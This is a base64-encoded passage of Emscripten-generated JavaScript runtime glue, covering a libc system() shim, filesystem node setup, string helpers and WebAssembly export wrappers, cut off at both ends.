lcy5sZW5ndGggPiBtYXhzaXplKSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KICANCiAgICAgIHdyaXRlQXJyYXlUb01lbW9yeShieXRlcywgcyk7DQogICAgICByZXR1cm4gYnl0ZXMubGVuZ3RoLTE7DQogICAgfWZ1bmN0aW9uIF9zdHJmdGltZV9sKHMsIG1heHNpemUsIGZvcm1hdCwgdG0pIHsNCiAgICAgIHJldHVybiBfc3RyZnRpbWUocywgbWF4c2l6ZSwgZm9ybWF0LCB0bSk7IC8vIG5vIGxvY2FsZSBzdXBwb3J0IHlldA0KICAgIH0NCg0KICBmdW5jdGlvbiBfc3lzdGVtKGNvbW1hbmQpIHsNCiAgICAgIGlmIChFTlZJUk9OTUVOVF9JU19OT0RFKSB7DQogICAgICAgIGlmICghY29tbWFuZCkgcmV0dXJuIDE7IC8vIHNoZWxsIGlzIGF2YWlsYWJsZQ0KICANCiAgICAgICAgdmFyIGNtZHN0ciA9IFVURjhUb1N0cmluZyhjb21tYW5kKTsNCiAgICAgICAgaWYgKCFjbWRzdHIubGVuZ3RoKSByZXR1cm4gMDsgLy8gdGhpcyBpcyB3aGF0IGdsaWJjIHNlZW1zIHRvIGRvIChzaGVsbCB3b3JrcyB0ZXN0PykNCiAgDQogICAgICAgIHZhciBjcCA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKTsNCiAgICAgICAgdmFyIHJldCA9IGNwLnNwYXduU3luYyhjbWRzdHIsIFtdLCB7c2hlbGw6dHJ1ZSwgc3RkaW86J2luaGVyaXQnfSk7DQogIA0KICAgICAgICB2YXIgX1dfRVhJVENPREUgPSBmdW5jdGlvbihyZXQsIHNpZykgew0KICAgICAgICAgIHJldHVybiAoKHJldCkgPDwgOCB8IChzaWcpKTsNCiAgICAgICAgfQ0KICANCiAgICAgICAgLy8gdGhpcyByZWFsbHkgb25seSBjYW4gaGFwcGVuIGlmIHByb2Nlc3MgaXMga2lsbGVkIGJ5IHNpZ25hbA0KICAgICAgICBpZiAocmV0LnN0YXR1cyA9PT0gbnVsbCkgew0KICAgICAgICAgIC8vIHNhZGx5IG5vZGUgZG9lc24ndCBleHBvc2Ugc3VjaCBmdW5jdGlvbg0KICAgICAgICAgIHZhciBzaWduYWxUb051bWJlciA9IGZ1bmN0aW9uKHNpZykgew0KICAgICAgICAgICAgLy8gaW1wbGVtZW50IG9ubHkgdGhlIG1vc3QgY29tbW9uIG9uZXMsIGFuZCBmYWxsYmFjayB0byBTSUdJTlQNCiAgICAgICAgICAgIHN3aXRjaCAoc2lnKSB7DQogICAgICAgICAgICAgIGNhc2UgJ1NJR0hVUCc6IHJldHVybiAxOw0KICAgICAgICAgICAgICBjYXNlICdTSUdJTlQnOiByZXR1cm4gMjsNCiAgICAgICAgICAgICAgY2FzZSAnU0lHUVVJVCc6IHJldHVybiAzOw0KICAgICAgICAgICAgICBjYXNlICdTSUdGUEUnOiByZXR1cm4gODsNCiAgICAgICAgICAgICAgY2FzZSAnU0lHS0lMTCc6IHJldHVybiA5Ow0KICAgICAgICAgICAgICBjYXNlICdTSUdBTFJNJzogcmV0dXJuIDE0Ow0KICAgICAgICAgICAgICBjYXNlICdTSUdURVJNJzogcmV0dXJuIDE1Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIDI7IC8vIFNJR0lOVA0KICAgICAgICAgIH0NCiAgICAgICAgICByZXR1cm4gX1dfRVhJVENPREUoMCwgc2lnbmFsVG9OdW1iZXIocmV0LnNpZ25hbCkpOw0KICAgICAgICB9DQogIA0KICAgICAgICByZXR1cm4gX1dfRVhJVENPREUocmV0LnN0YXR1cywgMCk7DQogICAgICB9DQogICAgICAvLyBpbnQgc3lzdGVtKGNvbnN0IGNoYXIgKmNvbW1hbmQpOw0KICAgICAgLy8gaHR0cDovL3B1YnMub3Blbmdyb3VwLm9yZy9vbmxpbmVwdWJzLzAwMDA5NTM5OS9mdW5jdGlvbnMvc3lzdGVtLmh0bWwNCiAgICAgIC8vIENhbid0IGNhbGwgZXh0ZXJuYWwgcHJvZ3JhbXMuDQogICAgICBpZiAoIWNvbW1hbmQpIHJldHVybiAwOyAvLyBubyBzaGVsbCBhdmFpbGFibGUNCiAgICAgIHNldEVyck5vKDYpOw0KICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCnZhciBGU05vZGUgPSAvKiogQGNvbnN0cnVjdG9yICovIGZ1bmN0aW9uKHBhcmVudCwgbmFtZSwgbW9kZSwgcmRldikgew0KICAgIGlmICghcGFyZW50KSB7DQogICAgICBwYXJlbnQgPSB0aGlzOyAgLy8gcm9vdCBub2RlIHNldHMgcGFyZW50IHRvIGl0c2VsZg0KICAgIH0NCiAgICB0aGlzLnBhcmVudCA9IHBhcmVudDsNCiAgICB0aGlzLm1vdW50ID0gcGFyZW50Lm1vdW50Ow0KICAgIHRoaXMubW91bnRlZCA9IG51bGw7DQogICAgdGhpcy5pZCA9IEZTLm5leHRJbm9kZSsrOw0KICAgIHRoaXMubmFtZSA9IG5hbWU7DQogICAgdGhpcy5tb2RlID0gbW9kZTsNCiAgICB0aGlzLm5vZGVfb3BzID0ge307DQogICAgdGhpcy5zdHJlYW1fb3BzID0ge307DQogICAgdGhpcy5yZGV2ID0gcmRldjsNCiAgfTsNCiAgdmFyIHJlYWRNb2RlID0gMjkyLyoyOTIqLyB8IDczLyo3MyovOw0KICB2YXIgd3JpdGVNb2RlID0gMTQ2LyoxNDYqLzsNCiAgT2JqZWN0LmRlZmluZVByb3BlcnRpZXMoRlNOb2RlLnByb3RvdHlwZSwgew0KICAgcmVhZDogew0KICAgIGdldDogLyoqIEB0aGlze0ZTTm9kZX0gKi9mdW5jdGlvbigpIHsNCiAgICAgcmV0dXJuICh0aGlzLm1vZGUgJiByZWFkTW9kZSkgPT09IHJlYWRNb2RlOw0KICAgIH0sDQogICAgc2V0OiAvKiogQHRoaXN7RlNOb2RlfSAqL2Z1bmN0aW9uKHZhbCkgew0KICAgICB2YWwgPyB0aGlzLm1vZGUgfD0gcmVhZE1vZGUgOiB0aGlzLm1vZGUgJj0gfnJlYWRNb2RlOw0KICAgIH0NCiAgIH0sDQogICB3cml0ZTogew0KICAgIGdldDogLyoqIEB0aGlze0ZTTm9kZX0gKi9mdW5jdGlvbigpIHsNCiAgICAgcmV0dXJuICh0aGlzLm1vZGUgJiB3cml0ZU1vZGUpID09PSB3cml0ZU1vZGU7DQogICAgfSwNCiAgICBzZXQ6IC8qKiBAdGhpc3tGU05vZGV9ICovZnVuY3Rpb24odmFsKSB7DQogICAgIHZhbCA/IHRoaXMubW9kZSB8PSB3cml0ZU1vZGUgOiB0aGlzLm1vZGUgJj0gfndyaXRlTW9kZTsNCiAgICB9DQogICB9LA0KICAgaXNGb2xkZXI6IHsNCiAgICBnZXQ6IC8qKiBAdGhpc3tGU05vZGV9ICovZnVuY3Rpb24oKSB7DQogICAgIHJldHVybiBGUy5pc0Rpcih0aGlzLm1vZGUpOw0KICAgIH0NCiAgIH0sDQogICBpc0RldmljZTogew0KICAgIGdldDogLyoqIEB0aGlze0ZTTm9kZX0gKi9mdW5jdGlvbigpIHsNCiAgICAgcmV0dXJuIEZTLmlzQ2hyZGV2KHRoaXMubW9kZSk7DQogICAgfQ0KICAgfQ0KICB9KTsNCiAgRlMuRlNOb2RlID0gRlNOb2RlOw0KICBGUy5zdGF0aWNJbml0KCk7Ow0KdmFyIEFTU0VSVElPTlMgPSB0cnVlOw0KDQoNCg0KLyoqIEB0eXBlIHtmdW5jdGlvbihzdHJpbmcsIGJvb2xlYW49LCBudW1iZXI9KX0gKi8NCmZ1bmN0aW9uIGludEFycmF5RnJvbVN0cmluZyhzdHJpbmd5LCBkb250QWRkTnVsbCwgbGVuZ3RoKSB7DQogIHZhciBsZW4gPSBsZW5ndGggPiAwID8gbGVuZ3RoIDogbGVuZ3RoQnl0ZXNVVEY4KHN0cmluZ3kpKzE7DQogIHZhciB1OGFycmF5ID0gbmV3IEFycmF5KGxlbik7DQogIHZhciBudW1CeXRlc1dyaXR0ZW4gPSBzdHJpbmdUb1VURjhBcnJheShzdHJpbmd5LCB1OGFycmF5LCAwLCB1OGFycmF5Lmxlbmd0aCk7DQogIGlmIChkb250QWRkTnVsbCkgdThhcnJheS5sZW5ndGggPSBudW1CeXRlc1dyaXR0ZW47DQogIHJldHVybiB1OGFycmF5Ow0KfQ0KDQpmdW5jdGlvbiBpbnRBcnJheVRvU3RyaW5nKGFycmF5KSB7DQogIHZhciByZXQgPSBbXTsNCiAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcnJheS5sZW5ndGg7IGkrKykgew0KICAgIHZhciBjaHIgPSBhcnJheVtpXTsNCiAgICBpZiAoY2hyID4gMHhGRikgew0KICAgICAgaWYgKEFTU0VSVElPTlMpIHsNCiAgICAgICAgYXNzZXJ0KGZhbHNlLCAnQ2hhcmFjdGVyIGNvZGUgJyArIGNociArICcgKCcgKyBTdHJpbmcuZnJvbUNoYXJDb2RlKGNocikgKyAnKSAgYXQgb2Zmc2V0ICcgKyBpICsgJyBub3QgaW4gMHgwMC0weEZGLicpOw0KICAgICAgfQ0KICAgICAgY2hyICY9IDB4RkY7DQogICAgfQ0KICAgIHJldC5wdXNoKFN0cmluZy5mcm9tQ2hhckNvZGUoY2hyKSk7DQogIH0NCiAgcmV0dXJuIHJldC5qb2luKCcnKTsNCn0NCg0KDQp2YXIgYXNtR2xvYmFsQXJnID0ge307DQp2YXIgYXNtTGlicmFyeUFyZyA9IHsgIl9fY3hhX2F0ZXhpdCI6IF9fX2N4YV9hdGV4aXQsICJfX2hhbmRsZV9zdGFja19vdmVyZmxvdyI6IF9fX2hhbmRsZV9zdGFja19vdmVyZmxvdywgIl9fbWFwX2ZpbGUiOiBfX19tYXBfZmlsZSwgIl9fc3lzX211bm1hcCI6IF9fX3N5c19tdW5tYXAsICJhYm9ydCI6IF9hYm9ydCwgImVtc2NyaXB0ZW5fZ2V0X3NicmtfcHRyIjogX2Vtc2NyaXB0ZW5fZ2V0X3NicmtfcHRyLCAiZW1zY3JpcHRlbl9tZW1jcHlfYmlnIjogX2Vtc2NyaXB0ZW5fbWVtY3B5X2JpZywgImVtc2NyaXB0ZW5fcmVzaXplX2hlYXAiOiBfZW1zY3JpcHRlbl9yZXNpemVfaGVhcCwgImVudmlyb25fZ2V0IjogX2Vudmlyb25fZ2V0LCAiZW52aXJvbl9zaXplc19nZXQiOiBfZW52aXJvbl9zaXplc19nZXQsICJmZF9jbG9zZSI6IF9mZF9jbG9zZSwgImZkX3JlYWQiOiBfZmRfcmVhZCwgImZkX3NlZWsiOiBfZmRfc2VlaywgImZkX3dyaXRlIjogX2ZkX3dyaXRlLCAibWVtb3J5Ijogd2FzbU1lbW9yeSwgInNldFRlbXBSZXQwIjogX3NldFRlbXBSZXQwLCAic3RyZnRpbWVfbCI6IF9zdHJmdGltZV9sLCAic3lzdGVtIjogX3N5c3RlbSwgInRhYmxlIjogd2FzbVRhYmxlIH07DQp2YXIgYXNtID0gY3JlYXRlV2FzbSgpOw0KLyoqIEB0eXBlIHtmdW5jdGlvbiguLi4qKTo/fSAqLw0KdmFyIF9fX3dhc21fY2FsbF9jdG9ycyA9IE1vZHVsZVsiX19fd2FzbV9jYWxsX2N0b3JzIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJfX3dhc21fY2FsbF9jdG9ycyIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgX21haW4gPSBNb2R1bGVbIl9tYWluIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJtYWluIik7DQoNCi8qKiBAdHlwZSB7ZnVuY3Rpb24oLi4uKik6P30gKi8NCnZhciBfX19lcnJub19sb2NhdGlvbiA9IE1vZHVsZVsiX19fZXJybm9fbG9jYXRpb24iXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoIl9fZXJybm9fbG9jYXRpb24iKTsNCg0KLyoqIEB0eXBlIHtmdW5jdGlvbiguLi4qKTo/fSAqLw0KdmFyIF9mZmx1c2ggPSBNb2R1bGVbIl9mZmx1c2giXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoImZmbHVzaCIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgc3RhY2tTYXZlID0gTW9kdWxlWyJzdGFja1NhdmUiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoInN0YWNrU2F2ZSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgc3RhY2tSZXN0b3JlID0gTW9kdWxlWyJzdGFja1Jlc3RvcmUiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoInN0YWNrUmVzdG9yZSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgc3RhY2tBbGxvYyA9IE1vZHVsZVsic3RhY2tBbGxvYyJdID0gY3JlYXRlRXhwb3J0V3JhcHBlcigic3RhY2tBbGxvYyIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgX2ZyZWUgPSBNb2R1bGVbIl9mcmVlIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJmcmVlIik7DQoNCi8qKiBAdHlwZSB7ZnVuY3Rpb24oLi4uKik6P30gKi8NCnZhciBfbWFsbG9jID0gTW9kdWxlWyJfbWFsbG9jIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJtYWxsb2MiKTsNCg0KLyoqIEB0eXBlIHtmdW5jdGlvbiguLi4qKTo/fSAqLw0KdmFyIF9fX3NldF9zdGFja19saW1pdCA9IE1vZHVsZVsiX19fc2V0X3N0YWNrX2xpbWl0Il0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJfX3NldF9zdGFja19saW1pdCIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgX19ncm93V2FzbU1lbW9yeSA9IE1vZHVsZVsiX19ncm93V2FzbU1lbW9yeSJdID0gY3JlYXRlRXhwb3J0V3JhcHBlcigiX19ncm93V2FzbU1lbW9yeSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF92aWkgPSBNb2R1bGVbImR5bkNhbGxfdmlpIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJkeW5DYWxsX3ZpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paSA9IE1vZHVsZVsiZHluQ2FsbF9paSJdID0gY3JlYXRlRXhwb3J0V3JhcHBlcigiZHluQ2FsbF9paSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF92aSA9IE1vZHVsZVsiZHluQ2FsbF92aSJdID0gY3JlYXRlRXhwb3J0V3JhcHBlcigiZHluQ2FsbF92aSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpID0gTW9kdWxlWyJkeW5DYWxsX2lpaWkiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoImR5bkNhbGxfaWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF92aWlqaWkgPSBNb2R1bGVbImR5bkNhbGxfdmlpamlpIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJkeW5DYWxsX3ZpaWppaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF92aWlpaSA9IE1vZHVsZVsiZHluQ2FsbF92aWlpaSJdID0gY3JlYXRlRXhwb3J0V3JhcHBlcigiZHluQ2FsbF92aWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWkgPSBNb2R1bGVbImR5bkNhbGxfaWlpIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJkeW5DYWxsX2lpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9qaWppID0gTW9kdWxlWyJkeW5DYWxsX2ppamkiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoImR5bkNhbGxfamlqaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWRpaWlpID0gTW9kdWxlWyJkeW5DYWxsX2lpZGlpaWkiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoImR5bkNhbGxfaWlkaWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaSA9IE1vZHVsZVsiZHluQ2FsbF9paWlpaSJdID0gY3JlYXRlRXhwb3J0V3JhcHBlcigiZHluQ2FsbF9paWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaWkgPSBNb2R1bGVbImR5bkNhbGxfaWlpaWlpIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJkeW5DYWxsX2lpaWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaWlpaWkgPSBNb2R1bGVbImR5bkNhbGxfaWlpaWlpaWlpIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJkeW5DYWxsX2lpaWlpaWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaWlpID0gTW9kdWxlWyJkeW5DYWxsX2lpaWlpaWkiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoImR5bkNhbGxfaWlpaWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaWogPSBNb2R1bGVbImR5bkNhbGxfaWlpaWlqIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJkeW5DYWxsX2lpaWlpaiIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaWQgPSBNb2R1bGVbImR5bkNhbGxfaWlpaWlkIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJkeW5DYWxsX2lpaWlpZCIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaWpqID0gTW9kdWxlWyJkeW5DYWxsX2lpaWlpamoiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoImR5bkNhbGxfaWlpaWlqaiIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaWlpaSA9IE1vZHVsZVsiZHluQ2FsbF9paWlpaWlpaSJdID0gY3JlYXRlRXhwb3J0V3JhcHBlcigiZHluQ2FsbF9paWlpaWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF9paWlpaWlqaiA9IE1vZHVsZVsiZHluQ2FsbF9paWlpaWlqaiJdID0gY3JlYXRlRXhwb3J0V3JhcHBlcigiZHluQ2FsbF9paWlpaWlqaiIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF92aWlpaWlpID0gTW9kdWxlWyJkeW5DYWxsX3ZpaWlpaWkiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoImR5bkNhbGxfdmlpaWlpaSIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF92ID0gTW9kdWxlWyJkeW5DYWxsX3YiXSA9IGNyZWF0ZUV4cG9ydFdyYXBwZXIoImR5bkNhbGxfdiIpOw0KDQovKiogQHR5cGUge2Z1bmN0aW9uKC4uLiopOj99ICovDQp2YXIgZHluQ2FsbF92aWlpaWkgPSBNb2R1bGVbImR5bkNhbGxfdmlpaWlpIl0gPSBjcmVhdGVFeHBvcnRXcmFwcGVyKCJkeW5DYWxsX3ZpaWlpaSIpOw0KDQoNCg0KDQoNCi8vID09PSBBdXRvLWdlbmVyYXRlZCBwb3N0YW1ibGUgc2V0dXAgZW50cnkgc3R1ZmYgPT09DQoNCg0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgImludEFycmF5RnJvbVN0cmluZyIpKSBNb2R1bGVbImludEFycmF5RnJvbVN0cmluZyJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInaW50QXJyYXlGcm9tU3RyaW5nJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9Ow0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgImludEFycmF5VG9TdHJpbmciKSkgTW9kdWxlWyJpbnRBcnJheVRvU3RyaW5nIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidpbnRBcnJheVRvU3RyaW5nJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9Ow0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgImNjYWxsIikpIE1vZHVsZVsiY2NhbGwiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2NjYWxsJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9Ow0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgImN3cmFwIikpIE1vZHVsZVsiY3dyYXAiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2N3cmFwJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9Ow0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgInNldFZhbHVlIikpIE1vZHVsZVsic2V0VmFsdWUiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3NldFZhbHVlJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9Ow0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgImdldFZhbHVlIikpIE1vZHVsZVsiZ2V0VmFsdWUiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2dldFZhbHVlJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9Ow0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgImFsbG9jYXRlIikpIE1vZHVsZVsiYWxsb2NhdGUiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2FsbG9jYXRlJyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkiKSB9Ow0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgImdldE1lbW9yeSIpKSBNb2R1bGVbImdldE1lbW9yeSJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInZ2V0TWVtb3J5JyB3YXMgbm90IGV4cG9ydGVkLiBhZGQgaXQgdG8gRVhUUkFfRVhQT1JURURfUlVOVElNRV9NRVRIT0RTIChzZWUgdGhlIEZBUSkuIEFsdGVybmF0aXZlbHksIGZvcmNpbmcgZmlsZXN5c3RlbSBzdXBwb3J0ICgtcyBGT1JDRV9GSUxFU1lTVEVNPTEpIGNhbiBleHBvcnQgdGhpcyBmb3IgeW91IikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJVVEY4QXJyYXlUb1N0cmluZyIpKSBNb2R1bGVbIlVURjhBcnJheVRvU3RyaW5nIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidVVEY4QXJyYXlUb1N0cmluZycgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJVVEY4VG9TdHJpbmciKSkgTW9kdWxlWyJVVEY4VG9TdHJpbmciXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ1VURjhUb1N0cmluZycgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJzdHJpbmdUb1VURjhBcnJheSIpKSBNb2R1bGVbInN0cmluZ1RvVVRGOEFycmF5Il0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidzdHJpbmdUb1VURjhBcnJheScgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJzdHJpbmdUb1VURjgiKSkgTW9kdWxlWyJzdHJpbmdUb1VURjgiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ3N0cmluZ1RvVVRGOCcgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJsZW5ndGhCeXRlc1VURjgiKSkgTW9kdWxlWyJsZW5ndGhCeXRlc1VURjgiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2xlbmd0aEJ5dGVzVVRGOCcgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJzdGFja1RyYWNlIikpIE1vZHVsZVsic3RhY2tUcmFjZSJdID0gZnVuY3Rpb24oKSB7IGFib3J0KCInc3RhY2tUcmFjZScgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJhZGRPblByZVJ1biIpKSBNb2R1bGVbImFkZE9uUHJlUnVuIl0gPSBmdW5jdGlvbigpIHsgYWJvcnQoIidhZGRPblByZVJ1bicgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJhZGRPbkluaXQiKSkgTW9kdWxlWyJhZGRPbkluaXQiXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2FkZE9uSW5pdCcgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJhZGRPblByZU1haW4iKSkgTW9kdWxlWyJhZGRPblByZU1haW4iXSA9IGZ1bmN0aW9uKCkgeyBhYm9ydCgiJ2FkZE9uUHJlTWFpbicgd2FzIG5vdCBleHBvcnRlZC4gYWRkIGl0IHRvIEVYVFJBX0VYUE9SVEVEX1JVTlRJTUVfTUVUSE9EUyAoc2VlIHRoZSBGQVEpIikgfTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICJhZGRPbkV4aXQiKSkgTW9kdWxlWy